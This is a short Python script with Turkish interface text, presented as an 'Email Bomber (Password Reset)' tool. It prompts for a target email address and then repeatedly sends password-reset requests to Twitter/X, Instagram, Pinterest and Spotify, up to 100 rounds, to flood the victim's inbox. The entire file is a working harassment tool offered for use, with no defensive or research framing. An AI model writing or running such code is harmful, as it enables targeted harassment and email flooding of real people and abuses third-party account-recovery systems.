import requests
import time
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn

console = Console()

RESET_URLS = [
    ("Twitter/X", "https://twitter.com/account/begin_password_reset"),
    ("Instagram", "https://www.instagram.com/accounts/account_recovery_send_ajax/"),
    ("Pinterest", "https://www.pinterest.com/password/reset/"),
    ("Spotify", "https://accounts.spotify.com/en/password-reset"),
]


def run():
    console.print("[#818cf8]  Email Bomber (Password Reset)[/]")
    console.print("[dim]  Cesitli platformlardan sifre sifirlama emaili gonderir.[/]")

    email = console.input("[bold white]  Hedef email: [/]").strip()
    count_str = console.input("[bold white]  Kac tur (varsayilan 5): [/]").strip()
    count = int(count_str) if count_str.isdigit() and 0 < int(count_str) <= 100 else 5

    if not email:
        console.print("[red]  Email bos olamaz.[/]")
        return

    sent = 0
    with Progress(
        SpinnerColumn(spinner_name="moon"),
        TextColumn("[#818cf8]{task.description}[/]"),
        BarColumn(bar_width=30, style="#312e81", complete_style="#818cf8"),
        console=console,
    ) as progress:
        task = progress.add_task("Reset istekleri gonderiliyor...", total=count * len(RESET_URLS))

        for _ in range(count):
            for name, url in RESET_URLS:
                try:
                    requests.post(url, data={"email": email}, timeout=10)
                    sent += 1
                    console.print(f"[#818cf8]  [+] {name}: Reset gonderildi[/]")
                except Exception:
                    console.print(f"[red]  [-] {name}: Basarisiz[/]")
                progress.advance(task)
                time.sleep(0.5)

    console.print(f"\n[#818cf8]  Tamamlandi. Toplam istek: {sent}[/]")
